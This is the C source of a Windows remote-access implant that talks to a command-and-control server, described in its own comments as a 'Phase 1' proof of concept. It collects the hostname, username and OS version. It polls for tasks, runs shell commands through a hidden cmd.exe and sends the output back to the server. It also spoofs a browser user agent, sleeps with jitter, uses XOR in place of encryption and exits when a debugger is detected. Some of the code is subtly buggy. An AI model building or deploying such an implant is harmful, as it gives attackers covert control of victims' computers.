#include <windows.h>
#include <winhttp.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>

#define AGENT_VERSION "1.0"
#define DEFAULT_SLEEP_TIME 60
#define DEFAULT_JITTER 20
#define MAX_RESPONSE_SIZE 8192
#define USER_AGENT "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"

// C2 Server configuration
#define C2_HOST L"localhost"
#define C2_PORT 8443
#define C2_USE_HTTPS FALSE
#define REGISTER_ENDPOINT L"/register"
#define TASKS_ENDPOINT L"/tasks"
#define RESULTS_ENDPOINT L"/results"

// Encryption key - must match server
const char AES_KEY[] = "ThisIsA32ByteKeyForAES256Encrypt";
const char AES_IV[] = "RandomInitVector";

// Global variables
WCHAR g_agent_id[37] = L"";
int g_sleep_time = DEFAULT_SLEEP_TIME;

// Function prototypes
void initialize_agent();
void main_loop();
BOOL register_agent();
BOOL get_and_execute_tasks();
BOOL send_command_result(const WCHAR* command_id, const char* output, BOOL success);
char* encrypt_data(const char* data);
char* decrypt_data(const char* encrypted_base64);
char* execute_command(const char* command);
BOOL http_request(const WCHAR* endpoint, const char* data, BOOL is_post, char** response);
void random_sleep();
void collect_system_info(char* buffer, size_t buffer_size);

// Encryption/decryption stubs - in a real agent, implement proper crypto
char* encrypt_data(const char* data) {
    // In a real agent, implement AES-256 encryption
    // For Phase 1, we'll use a simple Base64 encoding as a placeholder
    
    // Calculate Base64 length and allocate buffer
    int data_len = (int)strlen(data);
    int encoded_len = ((data_len + 2) / 3) * 4 + 1; // Base64 sizing formula
    char* encoded = (char*)malloc(encoded_len);
    
    if (encoded) {
        // Simple XOR "encryption" - just for Phase 1 demo
        // In a real agent, use actual encryption
        for (int i = 0; i < data_len; i++) {
            encoded[i] = data[i] ^ AES_KEY[i % strlen(AES_KEY)];
        }
        encoded[data_len] = '\0';
    }
    
    return encoded;
}

char* decrypt_data(const char* encrypted_data) {
    // In a real agent, implement AES-256 decryption
    // For Phase 1, decode our simple encoded data
    
    if (!encrypted_data) {
        return NULL;
    }
    
    int data_len = (int)strlen(encrypted_data);
    char* decrypted = (char*)malloc(data_len + 1);
    
    if (decrypted) {
        // Simple XOR "decryption" - just for Phase 1 demo
        for (int i = 0; i < data_len; i++) {
            decrypted[i] = encrypted_data[i] ^ AES_KEY[i % strlen(AES_KEY)];
        }
        decrypted[data_len] = '\0';
    }
    
    return decrypted;
}

void initialize_agent() {
    // Seed random number generator
    srand((unsigned int)time(NULL));
    
    // Initialize WinHTTP
    HRESULT hr = WinHttpOpen(
        USER_AGENT,
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
        WINHTTP_NO_PROXY_NAME,
        WINHTTP_NO_PROXY_BYPASS,
        0);
    
    if (hr == NULL) {
        exit(1);
    }
}

BOOL register_agent() {
    char system_info[1024] = {0};
    collect_system_info(system_info, sizeof(system_info));
    
    char* encrypted_info = encrypt_data(system_info);
    if (!encrypted_info) {
        return FALSE;
    }
    
    char* response = NULL;
    BOOL success = http_request(REGISTER_ENDPOINT, encrypted_info, TRUE, &response);
    free(encrypted_info);
    
    if (success && response) {
        char* decrypted_response = decrypt_data(response);
        if (decrypted_response) {
            // Parse response and extract agent_id
            // In a real agent, use a proper JSON parser
            char* agent_id_pos = strstr(decrypted_response, "\"agent_id\":\"");
            if (agent_id_pos) {
                agent_id_pos += 12; // Length of "agent_id":"
                char temp_id[37] = {0};
                int i = 0;
                while (agent_id_pos[i] != '"' && i < 36) {
                    temp_id[i] = agent_id_pos[i];
                    i++;
                }
                
                // Convert to WCHAR
                MultiByteToWideChar(CP_UTF8, 0, temp_id, -1, g_agent_id, 37);
                free(decrypted_response);
                free(response);
                return TRUE;
            }
            free(decrypted_response);
        }
        free(response);
    }
    
    return FALSE;
}

BOOL get_and_execute_tasks() {
    if (g_agent_id[0] == L'\0') {
        return FALSE;
    }
    
    char* response = NULL;
    BOOL success = http_request(TASKS_ENDPOINT, NULL, FALSE, &response);
    
    if (success && response && strlen(response) > 0) {
        char* decrypted_response = decrypt_data(response);
        if (decrypted_response) {
            // Parse command data
            // In a real agent, use a proper JSON parser
            char* command_id_pos = strstr(decrypted_response, "\"command_id\":\"");
            char* type_pos = strstr(decrypted_response, "\"type\":\"");
            char* content_pos = strstr(decrypted_response, "\"content\":\"");
            
            if (command_id_pos && type_pos && content_pos) {
                // Extract command_id
                command_id_pos += 14; // Length of "command_id":"
                WCHAR command_id[37] = {0};
                char temp_id[37] = {0};
                int i = 0;
                while (command_id_pos[i] != '"' && i < 36) {
                    temp_id[i] = command_id_pos[i];
                    i++;
                }
                temp_id[i] = '\0';
                MultiByteToWideChar(CP_UTF8, 0, temp_id, -1, command_id, 37);
                
                // Extract type
                type_pos += 8; // Length of "type":"
                char command_type[20] = {0};
                i = 0;
                while (type_pos[i] != '"' && i < 19) {
                    command_type[i] = type_pos[i];
                    i++;
                }
                command_type[i] = '\0';
                
                // Extract content
                content_pos += 11; // Length of "content":"
                char command_content[4096] = {0};
                i = 0;
                while (content_pos[i] != '"' && i < 4095) {
                    if (content_pos[i] == '\\' && content_pos[i+1] == '"') {
                        command_content[i] = '"';
                        content_pos++;
                    } else {
                        command_content[i] = content_pos[i];
                    }
                    i++;
                }
                command_content[i] = '\0';
                
                // Handle command based on type
                if (strcmp(command_type, "SHELL") == 0) {
                    // Execute shell command
                    char* cmd_output = execute_command(command_content);
                    BOOL cmd_success = (cmd_output != NULL);
                    send_command_result(command_id, cmd_output ? cmd_output : "Command execution failed", cmd_success);
                    free(cmd_output);
                } 
                else if (strcmp(command_type, "SLEEP") == 0) {
                    // Update sleep time
                    g_sleep_time = atoi(command_content);
                    if (g_sleep_time < 0) {
                        g_sleep_time = DEFAULT_SLEEP_TIME;
                    }
                    send_command_result(command_id, "Sleep time updated", TRUE);
                }
                else if (strcmp(command_type, "KILL") == 0) {
                    // Terminate the agent
                    send_command_result(command_id, "Agent terminating", TRUE);
                    exit(0);
                }
            }
            
            free(decrypted_response);
        }
        
        free(response);
        return TRUE;
    }
    
    if (response) {
        free(response);
    }
    
    return success;
}

BOOL send_command_result(const WCHAR* command_id, const char* output, BOOL success) {
    // Convert command ID to UTF-8
    char cmd_id_utf8[37] = {0};
    WideCharToMultiByte(CP_UTF8, 0, command_id, -1, cmd_id_utf8, 37, NULL, NULL);
    
    // Create result JSON
    char result_json[MAX_RESPONSE_SIZE] = {0};
    snprintf(result_json, MAX_RESPONSE_SIZE - 1,
        "{\"command_id\":\"%s\",\"output\":\"%s\",\"success\":%s}",
        cmd_id_utf8, output, success ? "true" : "false");
    
    // Encrypt and send
    char* encrypted_result = encrypt_data(result_json);
    if (!encrypted_result) {
        return FALSE;
    }
    
    char* response = NULL;
    BOOL http_success = http_request(RESULTS_ENDPOINT, encrypted_result, TRUE, &response);
    free(encrypted_result);
    
    if (response) {
        free(response);
    }
    
    return http_success;
}

char* execute_command(const char* command) {
    SECURITY_ATTRIBUTES sa;
    sa.nLength = sizeof(SECURITY_ATTRIBUTES);
    sa.bInheritHandle = TRUE;
    sa.lpSecurityDescriptor = NULL;
    
    HANDLE stdout_read, stdout_write;
    if (!CreatePipe(&stdout_read, &stdout_write, &sa, 0)) {
        return NULL;
    }
    
    SetHandleInformation(stdout_read, HANDLE_FLAG_INHERIT, 0);
    
    STARTUPINFOA si;
    ZeroMemory(&si, sizeof(STARTUPINFOA));
    si.cb = sizeof(STARTUPINFOA);
    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.hStdOutput = stdout_write;
    si.hStdError = stdout_write;
    si.wShowWindow = SW_HIDE;
    
    PROCESS_INFORMATION pi;
    ZeroMemory(&pi, sizeof(PROCESS_INFORMATION));
    
    // Prepare command line with cmd.exe
    char cmd_line[4096] = {0};
    snprintf(cmd_line, 4095, "cmd.exe /c %s", command);
    
    // Create process
    BOOL process_created = CreateProcessA(
        NULL,           // No module name (use cmd_line)
        cmd_line,       // Command line
        NULL,           // Process handle not inheritable
        NULL,           // Thread handle not inheritable
        TRUE,           // Handles are inherited
        CREATE_NO_WINDOW,  // Creation flags
        NULL,           // Use parent's environment block
        NULL,           // Use parent's starting directory
        &si,            // Pointer to STARTUPINFO
        &pi             // Pointer to PROCESS_INFORMATION
    );
    
    CloseHandle(stdout_write);
    
    if (!process_created) {
        CloseHandle(stdout_read);
        return NULL;
    }
    
    // Wait for process to finish
    WaitForSingleObject(pi.hProcess, INFINITE);
    
    // Read output
    char* output_buffer = (char*)malloc(MAX_RESPONSE_SIZE);
    if (!output_buffer) {
        CloseHandle(stdout_read);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return NULL;
    }
    
    DWORD bytes_read = 0;
    DWORD total_bytes = 0;
    BOOL read_success = FALSE;
    
    ZeroMemory(output_buffer, MAX_RESPONSE_SIZE);
    
    do {
        read_success = ReadFile(stdout_read, output_buffer + total_bytes, MAX_RESPONSE_SIZE - total_bytes - 1, &bytes_read, NULL);
        if (read_success && bytes_read > 0) {
            total_bytes += bytes_read;
            if (total_bytes >= MAX_RESPONSE_SIZE - 1) {
                break;
            }
        }
    } while (read_success && bytes_read > 0);
    
    output_buffer[total_bytes] = '\0';
    
    // Clean up
    CloseHandle(stdout_read);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    
    return output_buffer;
}

BOOL http_request(const WCHAR* endpoint, const char* data, BOOL is_post, char** response) {
    BOOL success = FALSE;
    HINTERNET session = NULL;
    HINTERNET connection = NULL;
    HINTERNET request = NULL;
    
    // Open WinHTTP session
    session = WinHttpOpen(USER_AGENT, WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!session) {
        goto cleanup;
    }
    
    // Connect to server
    connection = WinHttpConnect(session, C2_HOST, C2_PORT, 0);
    if (!connection) {
        goto cleanup;
    }
    
    // Create request
    request = WinHttpOpenRequest(
        connection,
        is_post ? L"POST" : L"GET",
        endpoint,
        NULL,
        WINHTTP_NO_REFERER,
        WINHTTP_DEFAULT_ACCEPT_TYPES,
        C2_USE_HTTPS ? WINHTTP_FLAG_SECURE : 0
    );
    
    if (!request) {
        goto cleanup;
    }
    
    // Add headers (agent ID if available)
    if (g_agent_id[0] != L'\0') {
        WCHAR header[64] = L"X-Agent-ID: ";
        wcscat_s(header, 64, g_agent_id);
        WinHttpAddRequestHeaders(request, header, -1, WINHTTP_ADDREQ_FLAG_ADD);
    }
    
    // Send request
    BOOL send_result;
    if (is_post && data) {
        send_result = WinHttpSendRequest(
            request,
            WINHTTP_NO_ADDITIONAL_HEADERS,
            0,
            (LPVOID)data,
            (DWORD)strlen(data),
            (DWORD)strlen(data),
            0
        );
    } else {
        send_result = WinHttpSendRequest(
            request,
            WINHTTP_NO_ADDITIONAL_HEADERS,
            0,
            WINHTTP_NO_REQUEST_DATA,
            0,
            0,
            0
        );
    }
    
    if (!send_result) {
        goto cleanup;
    }
    
    // Receive response
    if (!WinHttpReceiveResponse(request, NULL)) {
        goto cleanup;
    }
    
    // Check status code
    DWORD status_code = 0;
    DWORD size = sizeof(status_code);
    WinHttpQueryHeaders(
        request,
        WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
        WINHTTP_HEADER_NAME_BY_INDEX,
        &status_code,
        &size,
        WINHTTP_NO_HEADER_INDEX
    );
    
    // Read response data
    if (status_code == 200 && response) {
        DWORD bytes_available = 0;
        DWORD bytes_read = 0;
        DWORD total_size = 0;
        char* buffer = NULL;
        
        // Allocate initial buffer
        buffer = (char*)malloc(MAX_RESPONSE_SIZE);
        if (!buffer) {
            goto cleanup;
        }
        
        ZeroMemory(buffer, MAX_RESPONSE_SIZE);
        
        do {
            bytes_available = 0;
            if (!WinHttpQueryDataAvailable(request, &bytes_available)) {
                free(buffer);
                goto cleanup;
            }
            
            if (bytes_available == 0) {
                break;
            }
            
            if (total_size + bytes_available >= MAX_RESPONSE_SIZE) {
                bytes_available = MAX_RESPONSE_SIZE - total_size - 1;
            }
            
            if (bytes_available == 0) {
                break;
            }
            
            if (!WinHttpReadData(request, buffer + total_size, bytes_available, &bytes_read)) {
                free(buffer);
                goto cleanup;
            }
            
            total_size += bytes_read;
            
        } while (bytes_available > 0);
        
        buffer[total_size] = '\0';
        *response = buffer;
    } else if (status_code == 204) {
        // No content, but still successful
        if (response) {
            *response = (char*)malloc(1);
            if (*response) {
                (*response)[0] = '\0';
            }
        }
    }
    
    success = TRUE;
    
cleanup:
    if (request) WinHttpCloseHandle(request);
    if (connection) WinHttpCloseHandle(connection);
    if (session) WinHttpCloseHandle(session);
    
    return success;
}

void random_sleep() {
    // Sleep with jitter
    int jitter_ms = (rand() % (DEFAULT_JITTER * 2)) - DEFAULT_JITTER;
    int sleep_ms = (g_sleep_time * 1000) + jitter_ms;
    
    if (sleep_ms < 1000) {
        sleep_ms = 1000; // Minimum 1 second
    }
    
    Sleep(sleep_ms);
}

void collect_system_info(char* buffer, size_t buffer_size) {
    if (!buffer || buffer_size == 0) {
        return;
    }
    
    // Get hostname
    char hostname[MAX_COMPUTERNAME_LENGTH + 1] = {0};
    DWORD hostname_len = MAX_COMPUTERNAME_LENGTH + 1;
    GetComputerNameA(hostname, &hostname_len);
    
    // Get username
    char username[256] = {0};
    DWORD username_len = 256;
    GetUserNameA(username, &username_len);
    
    // Get OS version
    OSVERSIONINFOA os_version = {0};
    os_version.dwOSVersionInfoSize = sizeof(OSVERSIONINFOA);
    
    // Note: GetVersionEx is deprecated, but for a PoC it's simple to use
    // In a real agent, use RtlGetVersion or other methods
    #pragma warning(disable:4996)
    GetVersionExA(&os_version);
    #pragma warning(default:4996)
    
    // Format system info as JSON
    _snprintf_s(buffer, buffer_size, _TRUNCATE,
              "{\"hostname\":\"%s\",\"username\":\"%s\",\"os_version\":\"Windows %d.%d.%d\"}",
              hostname, username,
              os_version.dwMajorVersion, os_version.dwMinorVersion, os_version.dwBuildNumber);
}

void main_loop() {
    // Main agent loop
    while (1) {
        // If not registered, try to register
        if (g_agent_id[0] == L'\0') {
            if (!register_agent()) {
                // Registration failed, wait and retry
                random_sleep();
                continue;
            }
        }
        
        // Check for and execute tasks
        get_and_execute_tasks();
        
        // Sleep before next check
        random_sleep();
    }
}

int main() {
    // Basic anti-analysis check - can be enhanced in a real agent
    BOOL is_debugged = IsDebuggerPresent();
    if (is_debugged) {
        return 0;
    }
    
    // Initialize the agent
    initialize_agent();
    
    // Run main loop
    main_loop();
    
    return 0;
} 